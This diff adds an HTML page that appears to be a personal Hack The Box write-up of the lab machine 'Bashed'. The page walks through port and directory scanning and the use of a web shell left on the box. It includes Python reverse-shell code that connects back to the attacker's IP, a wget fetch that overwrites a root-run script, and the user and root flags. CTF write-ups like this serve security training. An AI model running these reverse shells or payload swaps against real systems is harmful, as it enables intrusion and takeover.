@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bashed</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            }
+        
+        body {
+            background-color: #0d1117;
+            color: #79c0ff;
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centers the header/title */
+            padding: 20px;
+        }
+
+        /* This is your main centered box */
+        .container {
+        display: flex; 
+            justify-content: center;
+            align-items: flex-start; 
+            gap: 30px; /* Increased gap between main box and sidebar */
+            margin: 0 auto; 
+            padding: 30px 30px; /* Adds 40px padding to left and right */
+            max-width: 1200px; /* Prevents the whole layout from becoming too wide */
+            width: 100%;
+        }
+
+        .main-content {
+        background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 30px;
+            /* Removed flex-shrink: 0 to allow responsiveness */
+            max-width: 700px; /* Reduced from 800px as requested */
+            width: 100%;
+
+            
+        }
+
+        .terminal-box {
+            display: block; /* Changed from inline-block to block to prevent side-by-side issues */
+            background-color: #000000; 
+            color: #00FF00; 
+            padding: 15px; 
+            border-radius: 8px; 
+            font-family: 'Courier New', Courier, monospace;
+            border: 1px solid #333;
+            margin: 20px 0;
+            overflow-x: auto; /* Adds a scrollbar if the code line is too long */
+        }
+
+        h1, h2, h3 {
+            color: #79c0ff;
+            text-align: center; /* Centers your titles */
+            width: 100%;
+        }
+
+        p {
+            margin: 15px 0;
+            color: #8b949e;
+        }
+
+        a { color: #58a6ff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .sticky-element {
+            /* Keeps everything centered in the sticky note */
+            text-align: center;
+            position : sticky;
+            top: 20px;
+            padding: 15px;
+            }
+        
+        .sidebar {
+        flex: 0 1 250px; /* Grow: 0, Shrink: 1, Ideal width: 250px */
+            position: sticky;
+            top: 20px;
+        }       
+        
+    </style>
+</head>
+<body>
+<h1>Hack The Box</h1>
+<h2>Bashed</h2>
+<img src="/pngs/HTB/Easy/Alert/Alert.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Alert.png" style="border: none;">
+<h3>Easy</h3>
+
+<div class="container">
+    <div class="main-content">
+        <p>I started with port enumeration.</p>
+
+<div class="terminal-box">
+    sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n  10.10.10.68
+  </div>
+
+<br>
+<ul>
+    <li>" -p- --open " : scans all ports and shows which ones are open</li>
+    <li>" -sS " : SYN scan.</li>
+    <li>" --min-rate 5000 " : specifies how many packets should be sent simultaneously.</li>
+    <li>" -vvv " : increases the verbosity of the scan , displays more detailed information.</li>
+    <br>
+    To have a clear view of the SYN scan we add : <br>
+    <li>" -Pn " : disables ICMP Echo request.</li>
+    <li>" -n " : disables DNS resolution</li>
+</ul>
+
+<br><br>
+
+I found only port 80 open and enumerated it. <br><br>
+
+<div class="terminal-box">
+nmap -sC -sV -p80 10.10.10.68
+</div> <br>
+<ul>
+    <li>" -sC " : executes default scripts</li>
+    <li>" -sV " : scans for service detection.</li>
+</ul><br>
+There I found that the domain name was "bashed.htb". Next I had to configure the "/etc/hosts" file.
+<br>
+<div class="terminal-box">
+<xmp>
+sudo tee -a /etc/hosts > /dev/null <<EOT
+
+## bashed host
+10.10.10.68 bashed.htb
+EOT
+</xmp>
+</div>
+
+I started directory enumeration where I found the "/dev" directory.
+<div class="terminal-box">
+    gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt</div>
+<br><br>
+
+There I found and visited the "phpbash.php" file with a web shell running<br><br>
+
+"http://10.10.10.68/dev/phpbash.php"<br>
+<br>
+At arrexel's home directory we find the user's flag. <br>
+<fieldset style="width: fit-content;">
+    <legend>User Flag</legend>
+    9b5f9adaa7f8ee097b68bd599e31d1ce
+</fieldset>
+<br>
+<br>---------------------------------------------------------------------<br>
+Privillege escalation.
+<br>---------------------------------------------------------------------<br>
+
+First we try to obtain a reverse shell instead of the web shell.
+<br>
+From my machine I open a listener : 
+<div class="terminal-box">
+nc -lvnp 1234</div>
+<br>
+From the web shell I run the command : 
+<br>
+<div class="terminal-box">
+<xmp>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.17",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</xmp>
+</div>
+<br>
+Upgrading the reverse shell with these steps :
+<br>
+<div class="terminal-box">
+    <xmp>
+ python -c 'import pty; pty.spawn("/bin/bash")'
+    </xmp>
+    </div>
+<br>
+
+If we try the command "sudo -l" we find that we can run commands as "scriptmanager" with no password.
+<br>
+Next step is to check the directories. We find "/scripts". 
+<br>
+I tried to navigate there but I didn't have permissions.<br>
+I tried to change user to become "scriptmanager" by using "sudo"<br>
+<div class="terminal-box">
+    <xmp>
+sudo -i -u scriptmanager
+    </xmp>
+    </div>
+<br>
+
+Now we can see that there are two files : <br>
+<ul>
+    <li>test.py</li>
+    <li>test.txt</li>
+</ul><br>
+We can see that the test.txt was modified recently. <br>
+If we read the test.py file we can see that this is a script running through root.<br>
+So we modify it to get a reverse shell as root.<br>
+I created a file to my machine named tets.py and this was it's content.<br>     
+    <div class="terminal-box">
+        test.py<br>
+    <xmp>
+        import socket,subprocess,os
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("10.10.14.17",9002))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        import pty
+        pty.spawn("sh")
+</xmp>
+</div>
+<br>
+I opened a new listener to port 9002 and I opened an http server.<br>
+<br>
+<div class="terminal-box">
+    <xmp>
+python3 -m http.server 8000
+    </xmp>
+    </div>
+<br>
+
+From the reverse shell I downloaded the new "test.py"
+
+<br>
+<div class="terminal-box">
+    <xmp>
+wget http://10.10.14.17:8000/test.py -O /scripts/test.py    </xmp>
+    </div>
+<br>
+And I changed permissions to be accessible from everyone.
+<br>
+<div class="terminal-box">
+    chmod 777 test.py
+</div>
+<br>
+
+Back to our listener we can see that after a minute we have our shell as root.
+
+<img src=![[Pasted image 20250423145542.png]]> <br><br>
+
+<fieldset style="width: fit-content;">
+    <legend>Root Flag</legend>
+    318b1a2f4579d0e8161424267a74eb62
+</fieldset>
+<br>
+
+</div>
+<aside class="sidebar">
+    <div class="sticky-element">
+        <a href="/index.html"><h3>Home</h3></a>
+        <a href="/machines.html"><h3>Machines</h3></a>
+    </div>
+</aside>
+  
+</div>
+  
+</body>
+  
+</html>
